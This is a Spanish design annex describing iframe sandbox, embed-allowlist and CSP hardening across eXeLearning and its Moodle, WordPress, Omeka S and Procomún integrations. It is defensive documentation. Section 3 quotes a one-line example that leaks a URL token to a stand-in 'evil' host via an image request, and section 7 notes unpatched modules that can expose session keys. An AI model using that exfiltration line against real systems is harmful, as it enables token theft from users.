# Anexo — Modo «siempre opaco» (endurecimiento posterior)

> Estado: **implementado** sobre las ramas de los PRs en curso — eXeLearning core
> (`fix/opaque-iframe-external-media`, PR #1968), `mod_exelearning` (`feature/secure-iframe-scorm-bridge`,
> PR #80), `wp-exelearning` (`feature/secure-iframe-sandbox`, PR #56), `omeka-s-exelearning`
> (`feature/secure-iframe-sandbox`, PR #21) y Procomún (`feat/align-embed-bridge-with-mod`, PR #260).
> Este anexo distingue lo
> **implementado** (con evidencia de test), las **limitaciones residuales** y el **trabajo futuro**.
> No sobreafirma: el aislamiento lo impone la política de sandbox del host y, ahora, también la
> previsualización del editor de eXeLearning core.

## 1. El origen opaco deja de ser opcional

- **eXeLearning core (previsualización del editor).** La previsualización del editor **no puede** usar
  origen opaco: el editor no tiene servidor y sirve la previsualización con un **Service Worker** cliente
  (`preview-sw.js`). Un Service Worker no controla un iframe de origen opaco —el navegador desactiva el SW
  sin `allow-same-origin` (*«Service worker is disabled because the context is sandboxed and lacks the
  allow-same-origin flag»*)—, de modo que el CSS/JS de la previsualización no cargarían (las peticiones
  caen a la red y reciben el `index.html` de la SPA, fallando la comprobación estricta de MIME). Por eso
  la previsualización del editor se mantiene **same-origin**; el aislamiento del contenido importado no
  confiable se apoya en el **saneador** del Y.Doc (la previsualización se regenera desde el documento
  saneado, sin `<script>` en línea). El origen opaco para contenido *verbatim* lo imponen los **plugins
  host**, donde un servidor real —no un Service Worker— sirve el paquete.
- **Plugins host (Moodle/WordPress/Omeka S).** Se elimina el modo `legacy` (same-origin) de la
  configuración de producción. No queda ningún ajuste de administración que reactive `allow-same-origin`
  para contenido de paquete no confiable, y **no hay degradación silenciosa**: si el servido seguro
  falla se muestra un aviso de bloqueo, nunca un fallback same-origin.
- **Procomún.** La previsualización ELPX ya era opaca; este endurecimiento confirma que no hay fallback
  same-origin.

> **Aclaración respecto a §6.2.2.** PR #1968 (el puente de medios) solo hace *funcionar* los medios
> externos dentro de un host opaco; **nunca** aportó el aislamiento del iframe. El aislamiento del
> contenido *verbatim* lo impone la política de sandbox de los **plugins host**; la previsualización del
> editor de core se mantiene same-origin por la limitación del Service Worker (su aislamiento se apoya en
> el saneador del Y.Doc).

## 2. Política de embeds: `strict` por defecto

El modo de promoción de embeds externos pasa a **`strict` por defecto** en los cinco repos; `open` es
una opción explícita (ajuste de administración en los plugins, variable de entorno
`PUBLIC_EXELEARNING_EMBED_MODE` en Procomún). Cualquier valor ausente o no reconocido **falla de forma
segura a `strict`**. En `strict` solo se promueven los proveedores mantenidos (YouTube, Vimeo,
Dailymotion, Mediateca de Madrid) con reconstrucción canónica de URL; se rechazan `userinfo`, no-HTTPS,
same-origin, sub/superdominios del LMS, literales IP, `localhost`/`.local`, ids malformados y el
*redirect-laundering*.

> **Corrección a §6.2.2/§6.3 (revisión previa).** El relé de superposición tenía por defecto el
> *invariante estructural* (cualquier iframe https cross-origin) y la *lista blanca* solo en `strict`.
> Tras este cambio el **valor por defecto es `strict`** (lista blanca + reconstrucción canónica), y
> `open` (invariante estructural) es la opción. El puente **modal** nunca recibe una URL: reconstruye
> la URL canónica desde `{proveedor, id}` con lista cerrada YouTube/Vimeo.

## 3. CSP: estricta por defecto, perfil `compatible` opcional

La CSP del documento de contenido es **estricta por defecto**: sin comodín `https:` en
`script/img/media-src` (de modo que el token de fichero que viaja en la URL no pueda exfiltrarse, p.
ej. con `new Image().src='https://evil/?'+location.pathname`), y `frame-src` limitada a los proveedores
mantenidos. Existe un perfil **`compatible`** explícito, documentado como más débil y **no** por
defecto (ajuste/filtro/entorno), que reabre `img/media/script` a `https:` para contenido con imágenes
externas o un CDN de MathJax. Con la CSP como mitigación primaria, el **IP-binding del token** (Moodle)
queda como **defensa en profundidad** (con su test de regresión).

## 4. MIME/PDF

Todo fichero servido lleva `X-Content-Type-Options: nosniff` y `Referrer-Policy: no-referrer`. Un PDF
same-origin debe pertenecer al paquete; un **PDF cross-origin** se renderiza con `sandbox="allow-same-origin"`
(sin scripts ni top-navigation), evitando que un servidor que sirva HTML en una ruta `.pdf` redirija la
pestaña del host a phishing. (Procomún sirve además todo asset no-HTML con CSP `sandbox`, cerrando el
vector de SVG same-origin.)

## 5. Control de deriva del puente compartido

`mod_exelearning/tools/check-embed-sync.mjs` se amplía para cubrir, además del relé/shim de promoción,
el **puente modal** (`exe_media_policy.js` en core + mod/wp/omeka/procomun, y el host raw-postMessage
`exe_media_host.js` en mod/wp/omeka/procomun; el fork SDK de core se excluye a propósito) e incluir
**Procomún**. Fuente canónica, comando de sincronización y estado de CI documentados en
`tools/EMBED-SYNC.md`. (Sin infraestructura de CI compartida entre repos, sigue siendo un paso local
obligatorio del checklist de PR.)

## 6. Evidencia de comportamiento: `testing-the-sandbox.elpx`

Se añade un fixture compartido (1 página, 1 iDevice de texto, 1 iframe de YouTube y una sonda en línea
que registra si `parent/top` `location/document/cookie/localStorage` son accesibles). En los hosts que
sirven el `.elpx` verbatim, la sonda debe reportar **bloqueo** (SecurityError) en modo opaco. La
previsualización del editor de eXe core **no** se ejercita con esta sonda: se sirve same-origin (por la
limitación del Service Worker) y su aislamiento se apoya en que el editor regenera la previsualización
desde el Y.Doc saneado (sin `<script>` en línea), no en el origen opaco.

## 7. Limitaciones residuales y trabajo futuro

- **Service Worker vs. iframe opaco (core y playgrounds php-wasm).** Un Service Worker no controla un
  iframe de origen opaco, así que cualquier contenido servido por un SW debe ser same-origin. Esto afecta
  a (a) la **previsualización del editor de core**, que siempre se sirve por SW y por tanto se mantiene
  same-origin; y (b) los **playgrounds php-wasm** (WordPress, Omeka **y Moodle**), cuyo SW solo sirve
  documentos same-origin. No se reintroduce el modo legacy de producción: se usa una **vía de escape solo
  para desarrollo** (constante `EXELEARNING_UNSAFE_LEGACY_IFRAME`, por defecto desactivada, fuera de la UI
  de administración; un test prueba que está apagada por defecto). La constante la declara el
  `blueprint.json` de **cada plugin** a través de un mecanismo **genérico** del playground —un mu-plugin
  vía `writeFile` en WordPress, y una propiedad `phpConstants` añadida a los motores de `moodle-playground`
  y `omeka-s-playground`—, de modo que la configuración vive en el plugin y no en el motor del playground.
  Es una **limitación de infraestructura del Playground**, no del plugin.
- **`mod_exeweb` y `mod_exescorm` siguen siendo vulnerables.** Renderizan contenido same-origin sin
  sandbox y pueden exponer `sesskey`/DOM/API. **No se modifican** en este trabajo. Hasta que reciban
  tratamiento de iframe opaco (y `mod_exescorm` un puente SCORM equivalente al de `mod_exelearning`),
  deben documentarse como **solo para contenido confiable**.
- **SCORM/xAPI en la previsualización de eXe core.** Core no tiene relé SCORM para su propia
  previsualización (es una comprobación visual, no un intento calificado), y se sirve same-origin por la
  limitación del Service Worker; su aislamiento frente a contenido importado no confiable lo da el
  saneador del Y.Doc. Los hosts que sí califican (Moodle) relevan SCORM/xAPI por puentes `postMessage`
  validados con rechazo de mensajes forjados (origen/nonce/acción/forma/replay), cubierto por sus tests
  `scorm_bridge.test.js` / `xapi_listener.test.js`.

> Las versiones EN del cuerpo (§6.2.2/§6.3) deben reflejar el nuevo **`strict` por defecto** y el modo
> «siempre opaco»; este anexo recoge los cambios implementados para incorporarlos en la próxima
> revisión del cuerpo.
